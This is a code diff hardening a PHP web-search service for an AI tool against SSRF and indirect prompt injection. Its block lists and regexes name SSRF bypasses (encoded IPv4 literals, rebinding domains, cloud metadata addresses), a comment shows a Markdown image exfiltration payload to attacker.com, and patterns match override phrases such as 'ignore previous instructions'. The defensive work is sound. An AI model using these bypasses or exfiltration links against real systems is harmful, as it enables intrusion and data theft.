@@ -670,16 +670,50 @@ final class ResilientWebSearchService
         }
 
         $host = strtolower(trim((string)$parts['host'], '[]'));
-        if ($host === '' || $host === 'localhost' || str_ends_with($host, '.local') || str_ends_with($host, '.internal')) {
-            return ['is_safe' => false, 'reason' => 'Localhost and internal domain names are blocked.'];
+        if (
+            $host === '' ||
+            $host === 'localhost' ||
+            $host === 'metadata.google.internal' ||
+            str_ends_with($host, '.local') ||
+            str_ends_with($host, '.localhost') ||
+            str_ends_with($host, '.internal') ||
+            str_ends_with($host, '.arpa') ||
+            str_ends_with($host, '.nip.io') ||
+            str_ends_with($host, '.sslip.io') ||
+            str_ends_with($host, '.xip.io') ||
+            str_ends_with($host, '.localtest.me') ||
+            str_ends_with($host, '.lvh.me')
+        ) {
+            return ['is_safe' => false, 'reason' => 'Localhost, internal, and DNS-rebinding wildcard domains are blocked.'];
         }
 
-        // Block literal IPv6 loopback / private / link-local
-        if ($host === '::1' || str_starts_with($host, 'fe80:') || str_starts_with($host, 'fc') || str_starts_with($host, 'fd')) {
-            return ['is_safe' => false, 'reason' => 'Private or loopback IPv6 address blocked.'];
+        // Block hex, octal, or integer-encoded IPv4 hostnames (e.g. 0x7f000001, 2130706433, 0177.0.0.1)
+        if (
+            ctype_digit($host) ||
+            preg_match('/^0x[0-9a-f]+$/i', $host) === 1 ||
+            preg_match('/^(?:0[0-7]+\.|0x[0-9a-f]+\.)/i', $host) === 1
+        ) {
+            return ['is_safe' => false, 'reason' => 'Obfuscated decimal, octal, or hexadecimal IP literal blocked.'];
         }
 
-        // If host is an IPv4 literal, validate public range directly
+        // Block hostnames embedding private/metadata IPv4 octets (e.g. 169.254.169.254.attacker.com or 127-0-0-1.evil.com)
+        if (preg_match('/(?:169[\.\-]254[\.\-]169[\.\-]254|127[\.\-]0[\.\-]0[\.\-]1|10[\.\-]0[\.\-]0[\.\-]|192[\.\-]168[\.\-])/i', $host) === 1) {
+            return ['is_safe' => false, 'reason' => 'Embedded private or cloud metadata IP pattern inside hostname is blocked.'];
+        }
+
+        // Block literal IPv6 loopback / private / link-local / IPv4-mapped IPv6 (::ffff:127.0.0.1)
+        if (
+            $host === '::1' ||
+            $host === '::' ||
+            str_starts_with($host, 'fe80:') ||
+            str_starts_with($host, 'fc') ||
+            str_starts_with($host, 'fd') ||
+            str_starts_with($host, '::ffff:')
+        ) {
+            return ['is_safe' => false, 'reason' => 'Private, loopback, or IPv4-mapped IPv6 address blocked.'];
+        }
+
+        // If host is an IPv4/IPv6 literal, validate public range directly
         if (filter_var($host, FILTER_VALIDATE_IP)) {
             $publicIp = filter_var(
                 $host,
@@ -704,11 +738,24 @@ final class ResilientWebSearchService
             return '';
         }
 
-        // Strip script/style blocks and HTML tags
-        $cleaned = (string)preg_replace('/<(script|style|iframe|object|embed)\b[^>]*>.*?<\/\1>/is', ' ', $rawSnippet);
+        // 1. Strip invisible Unicode zero-width/format characters and BiDi overrides used to evade token filters
+        $cleaned = (string)preg_replace('/[\x{200B}-\x{200F}\x{202A}-\x{202E}\x{2060}-\x{206F}\x{FEFF}]/u', '', $rawSnippet);
+
+        // 2. Normalise common Cyrillic/Greek homoglyphs used by offensive AI agents to bypass keyword filters
+        $homoglyphs = [
+            'а' => 'a', 'е' => 'e', 'і' => 'i', 'о' => 'o', 'р' => 'p', 'с' => 'c', 'у' => 'y', 'х' => 'x',
+            'А' => 'A', 'В' => 'B', 'Е' => 'E', 'І' => 'I', 'К' => 'K', 'М' => 'M', 'Н' => 'H', 'О' => 'O', 'Р' => 'P', 'С' => 'C', 'Т' => 'T', 'Х' => 'X',
+        ];
+        $cleaned = strtr($cleaned, $homoglyphs);
+
+        // 3. Strip script/style blocks and HTML tags
+        $cleaned = (string)preg_replace('/<(script|style|iframe|object|embed)\b[^>]*>.*?<\/\1>/is', ' ', $cleaned);
         $cleaned = strip_tags($cleaned);
 
-        // Neutralise Indirect Prompt Injection phrases found on malicious web pages
+        // 4. Strip Markdown image exfiltration payloads: ![alt](https://attacker.com/leak?data=...)
+        $cleaned = (string)preg_replace('/!\[[^\]]*\]\([^\)]*\)/', '[REDACTED_MARKDOWN_IMAGE]', $cleaned);
+
+        // 5. Neutralise Indirect Prompt Injection phrases found on malicious web pages
         $injectionPatterns = [
             '/ignore\s+(?:all\s+)?(?:previous|prior|above)\s+(?:instructions|prompts|rules)/i',
             '/disregard\s+(?:all\s+)?(?:previous|prior|above)\s+(?:instructions|prompts|rules)/i',
